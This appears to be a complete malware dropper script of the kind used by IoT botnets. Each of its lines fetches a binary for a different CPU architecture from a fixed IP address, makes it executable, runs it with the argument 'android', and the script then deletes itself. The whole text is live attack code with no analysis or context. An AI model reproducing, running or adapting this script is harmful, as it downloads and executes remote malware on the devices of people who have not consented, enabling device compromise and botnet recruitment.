wget http://5.181.159.78/arm; chmod 777 arm; ./arm android
wget http://5.181.159.78/arm5; chmod 777 arm5; ./arm5 android
wget http://5.181.159.78/arm6; chmod 777 arm6; ./arm6 android
wget http://5.181.159.78/arm7; chmod 777 arm7; ./arm7 android
wget http://5.181.159.78/m68k; chmod 777 m68k; ./m68k android
wget http://5.181.159.78/mips; chmod 777 mips; ./mips android
wget http://5.181.159.78/mpsl; chmod 777 mpsl; ./mpsl android
wget http://5.181.159.78/ppc; chmod 777 ppc; ./ppc android
wget http://5.181.159.78/sh4; chmod 777 sh4; ./sh4 android
wget http://5.181.159.78/spc; chmod 777 spc; ./spc android
wget http://5.181.159.78/x86; chmod 777 x86; ./x86 android
wget http://5.181.159.78/x86_64; chmod 777 x86_64; ./x86_64 android

rm $0
